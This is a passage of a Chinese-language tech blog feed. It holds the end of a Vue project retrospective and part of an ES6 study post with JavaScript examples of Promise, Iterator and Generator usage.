&apos;common&apos;: resolve(&apos;src/common&apos;),</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@import &apos;@~styles/mixins.styl&apos;;</span><br></pre></td></tr></table></figure></p><h3 id="函数节流"><a href="#函数节流" class="headerlink" title="函数节流"></a>函数节流</h3><p>对于某些高频事件，我们可以通过函数节流的方法，限制频率，从而达到节约性能的效果。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">keyword () &#123;</span><br><span class="line">  if (this.timer) &#123;</span><br><span class="line">    clearTimeout(this.timer)</span><br><span class="line">  &#125;</span><br><span class="line">  if (!this.keyword) &#123;</span><br><span class="line">    this.list = []</span><br><span class="line">    return</span><br><span class="line">  &#125;</span><br><span class="line">  this.timer = setTimeout(() =&gt; &#123;</span><br><span class="line">    const result = []</span><br><span class="line">    for (let i in this.cities) &#123;</span><br><span class="line">      this.cities[i].forEach((value) =&gt; &#123;</span><br><span class="line">        if (value.spell.indexOf(this.keyword) &gt; -1 || value.name.indexOf(this.keyword) &gt; -1) &#123;</span><br><span class="line">          result.push(value)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    this.list = result</span><br><span class="line">  &#125;, 100)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="全局事件的绑定与解绑"><a href="#全局事件的绑定与解绑" class="headerlink" title="全局事件的绑定与解绑"></a>全局事件的绑定与解绑</h3><p>有时我们会在子组件里对全局事件做绑定，但是为了不影响到其它页面，我们应该在合适的时间取消对全局事件的绑定，该操作分为两种情况。</p><ul><li>在使用keep-alive对页面做缓存时：在 <code>activated</code> 钩子函数里绑定 全局事件，在 <code>deactivated</code> 函数里解绑。</li><li>在不使用keep-alive对页面做缓存时：在 <code>mounted</code> 钩子函数里绑定 全局事件，在 <code>beforeDestory</code> 函数里解绑。</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此，vue仿去哪儿项目的学习总结就结束了。写一百个项目，不如深入理解学习一个项目，并从中吸取经验，项目虽小，但收获颇多。有关项目的更深入理解，等我研究了vue的源码后再继续补充。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;借着每天零碎的时间，终于跟着某课网的视频完成了vue仿去哪儿的小项目，通过这个项目的练手，对vue和组件化开发有了更深入的理解，本文就来梳理下整个项目开发中那些值得思考和学习的知识。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="前端" scheme="http://dangoying.ink/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="前端" scheme="http://dangoying.ink/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>ES6知识点梳理</title>
    <link href="http://dangoying.ink/ES6%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86.html"/>
    <id>http://dangoying.ink/ES6知识点梳理.html</id>
    <published>2019-08-31T14:53:35.000Z</published>
    <updated>2019-10-07T13:09:21.364Z</updated>
    
    <content type="html"><![CDATA[<p>最近拜读了阮一峰老师的ES6详解，虽然ES9已经大摇大摆亮相，但是ES6依然是一个跨时代的版本，其中不乏很多目前使用率颇高，功能性能上大为改进的新语法，所以还是决定对ES6做一个学习总结，也对其中部分闪光语法做详细解释。</p><a id="more"></a><h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p><img src="../assets/20190831/es6.png" alt="Alt text"></p><h2 id="Promise对象"><a href="#Promise对象" class="headerlink" title="Promise对象"></a>Promise对象</h2><h3 id="含义"><a href="#含义" class="headerlink" title="含义:"></a>含义:</h3><p>Promise 是异步编程的一种解决方案，简单说就是一个容器，里面保存着某个未来才会结束的事件（通常是一个异步操作）的结果。从它可以获取异步操作的消息。</p><h3 id="特点"><a href="#特点" class="headerlink" title="特点:"></a>特点:</h3><ul><li>对象的状态不受外界影响。</li><li>一旦状态改变，就不会再变，任何时候都可以得到这个结果。</li></ul><h3 id="基本用法："><a href="#基本用法：" class="headerlink" title="基本用法："></a>基本用法：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var promise = new Promise(function(resolve, reject) &#123; </span><br><span class="line">  // ... some code </span><br><span class="line">  if (/* 异步操作成功 */)&#123; </span><br><span class="line">    resolve(value); </span><br><span class="line">  &#125; else &#123; </span><br><span class="line">    reject(error); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Promise 实例生成以后，可以用 then 方法分别指定 resolved 状态和 rejected 状态的回调函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">promise.then(function(value) &#123; </span><br><span class="line">  // success </span><br><span class="line">&#125;, function(error) &#123; </span><br><span class="line">  // failure </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h3 id="Promise-prototype-then"><a href="#Promise-prototype-then" class="headerlink" title="Promise.prototype.then()"></a>Promise.prototype.then()</h3><p>Promise 实例具有 then 方法，也就是说， then 方法是定义在原型对 象 Promise.prototype 上的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getJSON(&quot;/post/1.json&quot;).then(function(post) &#123; </span><br><span class="line">    return getJSON(post.commentURL); </span><br><span class="line">&#125;).then(function funcA(comments) &#123; </span><br><span class="line">    console.log(&quot;resolved: &quot;, comments); </span><br><span class="line">&#125;, function funcB(err)&#123; </span><br><span class="line">    console.log(&quot;rejected: &quot;, err); </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h3 id="Promise-prototype-catch"><a href="#Promise-prototype-catch" class="headerlink" title="Promise.prototype.catch()"></a>Promise.prototype.catch()</h3><p>Promise.prototype.catch 方法是 .then(null, rejection) 的别名，用于指定发生错误时的回调函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getJSON(&apos;/post/1.json&apos;).then(function(post) &#123; </span><br><span class="line">    return getJSON(post.commentURL); </span><br><span class="line">&#125;).then(function(comments) &#123; </span><br><span class="line">    // some code </span><br><span class="line">&#125;).catch(function(error) &#123; </span><br><span class="line">    // 处理前面三个Promise产生的错误 </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h3 id="Promise-all"><a href="#Promise-all" class="headerlink" title="Promise.all()"></a>Promise.all()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var p = Promise.all([p1, p2, p3]);</span><br></pre></td></tr></table></figure><ul><li>Promise.all 方法用于将多个 Promise 实例，包装成一个新的 Promise 实例。</li><li>Promise.all 方法接受一个数组作为参数。</li><li>只有 p1 、 p2 、 p3 的状态都变成 fulfilled ， p 的状态才会变 成 fulfilled ，此时 p1 、 p2 、 p3 的返回值组成一个数组，传递给 p 的回调函数。</li><li>只要 p1 、 p2 、 p3 之中有一个被 rejected ， p 的状态就变成 rejected ，此时第一个被 reject 的实例的返回值，会传递给 p 的回调函数。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var promises = [2, 3, 5, 7, 11, 13].map(function (id) &#123; </span><br><span class="line">    return getJSON(&apos;/post/&apos; + id + &quot;.json&quot;); </span><br><span class="line">&#125;); </span><br><span class="line">Promise.all(promises).then(function (posts) &#123; </span><br><span class="line">    // ... </span><br><span class="line">&#125;).catch(function(reason)&#123; </span><br><span class="line">    // ... </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="Promise-race"><a href="#Promise-race" class="headerlink" title="Promise.race()"></a>Promise.race()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var p = Promise.race([p1, p2, p3]);</span><br></pre></td></tr></table></figure><ul><li>Promise.race 方法同样是将多个Promise实例，包装成一个新的Promise实例。</li><li>方法接受一个数组作为参数。</li><li>只要 p1 、 p2 、 p3 之中有一个实例率先改变状态， p 的状态就跟着改变。那个率先改变的 Promise 实例的返回值，就传递给 p 的回调函数。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">const p = Promise.race([ </span><br><span class="line">    fetch(&apos;/resource-that-may-take-a-while&apos;), </span><br><span class="line">    new Promise(function (resolve, reject) &#123; </span><br><span class="line">        setTimeout(() =&gt; reject(new Error(&apos;request timeout&apos;)), 5000) </span><br><span class="line">    &#125;) </span><br><span class="line">]); </span><br><span class="line">p.then(response =&gt; console.log(response)); </span><br><span class="line">p.catch(error =&gt; console.log(error));</span><br></pre></td></tr></table></figure><h3 id="Promise-resolve"><a href="#Promise-resolve" class="headerlink" title="Promise.resolve()"></a>Promise.resolve()</h3><p>参数分成四种情况:</p><h4 id="参数是一个Promise实例："><a href="#参数是一个Promise实例：" class="headerlink" title="参数是一个Promise实例："></a>参数是一个Promise实例：</h4><p>不做任何修改、原封不动地返回这个实例。</p><h4 id="参数是一个-thenable-对象："><a href="#参数是一个-thenable-对象：" class="headerlink" title="参数是一个 thenable 对象："></a>参数是一个 thenable 对象：</h4><p>将这个对象转为Promise对象，然后就立即执行 thenable 对象的 then 方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">let thenable = &#123; </span><br><span class="line">  then: function(resolve, reject) &#123; </span><br><span class="line">    resolve(42); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;;</span><br><span class="line">let p1 = Promise.resolve(thenable); </span><br><span class="line">p1.then(function(value) &#123; </span><br><span class="line">  console.log(value); // 42 </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h4 id="参数不是具有-then-方法的对象，或根本就不是对象："><a href="#参数不是具有-then-方法的对象，或根本就不是对象：" class="headerlink" title="参数不是具有 then 方法的对象，或根本就不是对象："></a>参数不是具有 then 方法的对象，或根本就不是对象：</h4><p>返回一个新的Promise对象，状态为resolved。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var p = Promise.resolve(&apos;Hello&apos;); </span><br><span class="line">p.then(function (s)&#123; </span><br><span class="line">  console.log(s) </span><br><span class="line">&#125;); </span><br><span class="line">// Hello</span><br></pre></td></tr></table></figure></p><h4 id="不带有任何参数："><a href="#不带有任何参数：" class="headerlink" title="不带有任何参数："></a>不带有任何参数：</h4><p>直接返回一个 resolved 状态的Promise对象。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var p = Promise.resolve(); </span><br><span class="line">p.then(function () &#123; </span><br><span class="line">  // ... </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h4 id="执行顺序"><a href="#执行顺序" class="headerlink" title="执行顺序"></a>执行顺序</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(function () &#123; </span><br><span class="line">  console.log(&apos;three&apos;); </span><br><span class="line">&#125;, 0); </span><br><span class="line">Promise.resolve().then(function () &#123; </span><br><span class="line">  console.log(&apos;two&apos;); </span><br><span class="line">&#125;); </span><br><span class="line">console.log(&apos;one&apos;);</span><br><span class="line"></span><br><span class="line">//one</span><br><span class="line">//two</span><br><span class="line">//three</span><br></pre></td></tr></table></figure><ul><li>setTimeout(fn, 0) 在下一轮“事件循环”开始时执行。</li><li>Promise.resolve() 在本轮“事件循环”结束时执行。</li><li>console.log(‘one’) 则是立即执行，因此最先输出。</li></ul><h3 id="Promise-reject"><a href="#Promise-reject" class="headerlink" title="Promise.reject()"></a>Promise.reject()</h3><p>返回一个新的 Promise 实例，该实例的状态为 rejected。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var p = Promise.reject(&apos;出错了&apos;); </span><br><span class="line">// 等同于 </span><br><span class="line">var p = new Promise((resolve, reject) =&gt; reject(&apos;出错了&apos;)) </span><br><span class="line">p.then(null, function (s) &#123; </span><br><span class="line">  console.log(s) </span><br><span class="line">&#125;); </span><br><span class="line">// 出错了</span><br></pre></td></tr></table></figure></p><h3 id="done"><a href="#done" class="headerlink" title="done()"></a>done()</h3><p>总是处于回调链的尾端，保证抛出任何可能出现的错误。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">asyncFunc() </span><br><span class="line">  .then(f1) </span><br><span class="line">  .catch(r1) </span><br><span class="line">  .then(f2) </span><br><span class="line">  .done();</span><br></pre></td></tr></table></figure></p><h3 id="finally"><a href="#finally" class="headerlink" title="finally()"></a>finally()</h3><ul><li>finally 方法用于指定不管Promise对象最后状态如何，都会执行的操作。</li><li>它与 done 方法的最大区别，它接受一个普通的回调函数作为参数，该函数不管怎样都必须执行。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">server.listen(0) </span><br><span class="line">  .then(function () &#123; </span><br><span class="line">      // run test </span><br><span class="line">  &#125;)</span><br><span class="line">  .finally(server.stop);</span><br></pre></td></tr></table></figure><h3 id="Promise-try"><a href="#Promise-try" class="headerlink" title="Promise.try()"></a>Promise.try()</h3><ul><li>让同步函数同步进行，异步函数异步进行。</li><li>可以更好的管理异常。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Promise.try(database.users.get(&#123;id: userId&#125;)) </span><br><span class="line">  .then(...) </span><br><span class="line">  .catch(...)</span><br></pre></td></tr></table></figure><h2 id="Iterator和for…of循环"><a href="#Iterator和for…of循环" class="headerlink" title="Iterator和for…of循环"></a>Iterator和for…of循环</h2><h3 id="Iterator（遍历器）的概念"><a href="#Iterator（遍历器）的概念" class="headerlink" title="Iterator（遍历器）的概念"></a>Iterator（遍历器）的概念</h3><p>它是一种接口，为各种不同的数据结构提供统一的访问机制。任何数据结构只要部署Iterator接口，就可以完成遍历操作（即依次处理该数据结构的所有成员）。<br>遍历过程：</p><ul><li>创建一个指针对象，指向当前数据结构的起始位置。也就是说，遍历器对象本质上，就是一个指针对象。</li><li>第一次调用指针对象的 next 方法，可以将指针指向数据结构的第一个成员。</li><li>第二次调用指针对象的 next 方法，指针就指向数据结构的第二个成员。</li><li>不断调用指针对象的 next 方法，直到它指向数据结构的结束位置。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var it = makeIterator([&apos;a&apos;, &apos;b&apos;]); </span><br><span class="line">it.next() // &#123; value: &quot;a&quot;, done: false &#125; </span><br><span class="line">it.next() // &#123; value: &quot;b&quot;, done: false &#125; </span><br><span class="line">it.next() // &#123; value: undefined, done: true &#125; </span><br><span class="line">function makeIterator(array) &#123; </span><br><span class="line">  var nextIndex = 0; </span><br><span class="line">  return &#123; </span><br><span class="line">    next: function() &#123; </span><br><span class="line">      return nextIndex &lt; array.length ? </span><br><span class="line">      &#123;value: array[nextIndex++], done: false&#125; : </span><br><span class="line">      &#123;value: undefined, done: true&#125;; </span><br><span class="line">    &#125; </span><br><span class="line">  &#125;; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调用-Iterator-接口的场合"><a href="#调用-Iterator-接口的场合" class="headerlink" title="调用 Iterator 接口的场合"></a>调用 Iterator 接口的场合</h3><h4 id="解构赋值"><a href="#解构赋值" class="headerlink" title="解构赋值"></a>解构赋值</h4><p>对数组和 Set 结构进行解构赋值时，会默认调用 Symbol.iterator 方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">let set = new Set().add(&apos;a&apos;).add(&apos;b&apos;).add(&apos;c&apos;); </span><br><span class="line">let [x,y] = set; </span><br><span class="line">// x=&apos;a&apos;; y=&apos;b&apos; </span><br><span class="line">let [first, ...rest] = set; </span><br><span class="line">// first=&apos;a&apos;; rest=[&apos;b&apos;,&apos;c&apos;];</span><br></pre></td></tr></table></figure></p><h4 id="扩展运算符"><a href="#扩展运算符" class="headerlink" title="扩展运算符"></a>扩展运算符</h4><p>扩展运算符（…）也会调用默认的 Iterator 接口。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var str = &apos;hello&apos;; </span><br><span class="line">[...str] // [&apos;h&apos;,&apos;e&apos;,&apos;l&apos;,&apos;l&apos;,&apos;o&apos;]</span><br></pre></td></tr></table></figure></p><h4 id="yield"><a href="#yield" class="headerlink" title="yield*"></a>yield*</h4><p>yield* 后面跟的是一个可遍历的结构，它会调用该结构的遍历器接口。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">let generator = function* () &#123; </span><br><span class="line">  yield 1; </span><br><span class="line">  yield* [2,3,4]; </span><br><span class="line">  yield 5; </span><br><span class="line">&#125;;</span><br><span class="line">var iterator = generator(); </span><br><span class="line">iterator.next() // &#123; value: 1, done: false &#125; </span><br><span class="line">iterator.next() // &#123; value: 2, done: false &#125; </span><br><span class="line">iterator.next() // &#123; value: 3, done: false &#125; </span><br><span class="line">iterator.next() // &#123; value: 4, done: false &#125; </span><br><span class="line">iterator.next() // &#123; value: 5, done: false &#125; </span><br><span class="line">iterator.next() // &#123; value: undefined, done: true &#125;</span><br></pre></td></tr></table></figure></p><h4 id="其他场合"><a href="#其他场合" class="headerlink" title="其他场合"></a>其他场合</h4><p>由于数组的遍历会调用遍历器接口，所以任何接受数组作为参数的场合，其实都调用了遍历器接口。</p><ul><li>for…of </li><li>Array.from() </li><li>Map(), Set(), WeakMap(), WeakSet()（比如 new Map([[‘a’,1], [‘b’,2]]) ） </li><li>Promise.all() </li><li>Promise.race()</li></ul><h3 id="字符串的-Iterator-接口"><a href="#字符串的-Iterator-接口" class="headerlink" title="字符串的 Iterator 接口"></a>字符串的 Iterator 接口</h3><p>字符串是一个类似数组的对象，也原生具有 Iterator 接口。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var someString = &quot;hi&quot;; </span><br><span class="line">typeof someString[Symbol.iterator] </span><br><span class="line">// &quot;function&quot; </span><br><span class="line">var iterator = someString[Symbol.iterator](); </span><br><span class="line">iterator.next() // &#123; value: &quot;h&quot;, done: false &#125; </span><br><span class="line">iterator.next() // &#123; value: &quot;i&quot;, done: false &#125; </span><br><span class="line">iterator.next() // &#123; value: undefined, done: true &#125;</span><br></pre></td></tr></table></figure></p><h3 id="遍历器对象的return-，throw"><a href="#遍历器对象的return-，throw" class="headerlink" title="遍历器对象的return()，throw()"></a>遍历器对象的return()，throw()</h3><ul><li>遍历器对象除了具有 next 方法，还可以具有 return 方法和 throw 方法。</li><li>return 方法的使用场合是，如果 for…of 循环提前退出（通常是因为出错， 或者有 break 语句或 continue 语句），就会调用 return 方法。如果一个对象在完成遍历前，需要清理或释放资源，就可以部署 return 方法。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">function readLinesSync(file) &#123; </span><br><span class="line">  return &#123; </span><br><span class="line">    next() &#123; </span><br><span class="line">      return &#123; done: false &#125;; </span><br><span class="line">    &#125;,</span><br><span class="line">    return() &#123; </span><br><span class="line">      file.close(); </span><br><span class="line">      return &#123; done: true &#125;; </span><br><span class="line">    &#125;, </span><br><span class="line">  &#125;; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//return会被调用的情况</span><br><span class="line">// 情况一 </span><br><span class="line">for (let line of readLinesSync(fileName)) &#123; </span><br><span class="line">  console.log(line); </span><br><span class="line">  break; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 情况二 </span><br><span class="line">for (let line of readLinesSync(fileName)) &#123; </span><br><span class="line">  console.log(line); </span><br><span class="line">  continue; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 情况三 </span><br><span class="line">for (let line of readLinesSync(fileName)) &#123; </span><br><span class="line">  console.log(line); </span><br><span class="line">  throw new Error(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Generator函数"><a href="#Generator函数" class="headerlink" title="Generator函数"></a>Generator函数</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><ul><li>Generator 函数是一个状态机，封装了多个内部状态。</li><li>执行 Generator 函数会返回一个遍历器对象，也就是说，Generator 函数除了状态机，还是一个遍历器对象生成函数。</li><li>调用 Generator 函数后，该函数并不执行，返回的也不是函数运行结果，而是一个指向内部状态的指针对象</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function* helloWorldGenerator() &#123; </span><br><span class="line">  yield &apos;hello&apos;; </span><br><span class="line">  yield &apos;world&apos;; </span><br><span class="line">  return &apos;ending&apos;; </span><br><span class="line">&#125;</span><br><span class="line">var hw = helloWorldGenerator();</span><br><span class="line"></span><br><span class="line">hw.next() </span><br><span class="line">// &#123; value: &apos;hello&apos;, done: false &#125; </span><br><span class="line">hw.next() </span><br><span class="line">// &#123; value: &apos;world&apos;, done: false &#125; </span><br><span class="line">hw.next() </span><br><span class="line">// &#123; value: &apos;ending&apos;, done: true &#125; </span><br><span class="line">hw.next() </span><br><span class="line">// &#123; value: undefined, done: true &#125;</span><br></pre></td></tr></table></figure><h3 id="yield-表达式"><a href="#yield-表达式" class="headerlink" title="yield 表达式"></a>yield 表达式</h3><p>next 方法的运行逻辑:</p><ul><li>遇到 yield 表达式，就暂停执行后面的操作，并将紧跟在 yield 后面的那个表达式的值，作为返回的对象的 value 属性值。</li><li>下一次调用 next 方法时，再继续往下执行，直到遇到下一个 yield 表达式。</li><li>如果没有再遇到新的 yield 表达式，就一直运行到函数结束，直到 return 语句为止，并将 return 语句后面的表达式的值，作为返回的对象的 value 属性值。</li><li>如果该函数没有 return 语句，则返回的对象的 value 属性值为 undefined 。</li></ul><p>注意点：</p><ul><li>yield 表达式只能用在 Generator 函数里面，用在其他地方都会报错。</li><li>yield 表达式如果用在另一个表达式之中，必须放在圆括号里面。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function* demo() &#123; </span><br><span class="line">  console.log(&apos;Hello&apos; + yield); // SyntaxError </span><br><span class="line">  console.log(&apos;Hello&apos; + yield 123); // SyntaxError </span><br><span class="line">  console.log(&apos;Hello&apos; + (yield)); // OK </span><br><span class="line">  console.log(&apos;Hello&apos; + (yield 123)); // OK </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="next-方法的参数"><a href="#next-方法的参数" class="headerlink" title="next 方法的参数"></a>next 方法的参数</h3><p>yield 表达式本身没有返回值，或者说总是返回 undefined 。 next 方法可以带一个参数，该参数就会被当作上一个 yield 表达式的返回值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function* f() &#123; </span><br><span class="line">  for(var i = 0; true; i++) &#123; </span><br><span class="line">    var reset = yield i; </span><br><span class="line">    if(reset) &#123; </span><br><span class="line">      i = -1; </span><br><span class="line">    &#125; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">var g = f(); </span><br><span class="line">g.next() // &#123; value: 0, done: false &#125; </span><br><span class="line">g.next() // &#123; value: 1, done: false &#125; </span><br><span class="line">g.next(true) // &#123; value: 0, done: false &#125;</span><br></pre></td></tr></table></figure></p><h3 id="for…of-循环"><a href="#for…of-循环" class="headerlink" title="for…of 循环"></a>for…of 循环</h3><p>for…of 循环可以自动遍历 Generator 函数时生成的 Iterator 对象，且此时不再需要调用 next 方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function* numbers () &#123; </span><br><span class="line">  yield 1 </span><br><span class="line">  yield 2 </span><br><span class="line">  return 3 </span><br><span class="line">  yield 4 </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 扩展运算符 </span><br><span class="line">[...numbers()] // [1, 2] </span><br><span class="line"></span><br><span class="line">// Array.from 方法 </span><br><span class="line">Array.from(numbers()) // [1, 2] </span><br><span class="line"></span><br><span class="line">// 解构赋值 </span><br><span class="line">let [x, y] = numbers(); </span><br><span class="line">x // 1 </span><br><span class="line">y // 2 </span><br><span class="line"></span><br><span class="line">// for...of 循环 </span><br><span class="line">for (let n of numbers()) &#123; </span><br><span class="line">  console.log(n) </span><br><span class="line">&#125;</span><br><span class="line">// 1</span><br><span class="line">// 2</span><br></pre></td></tr></table></figure></p><h3 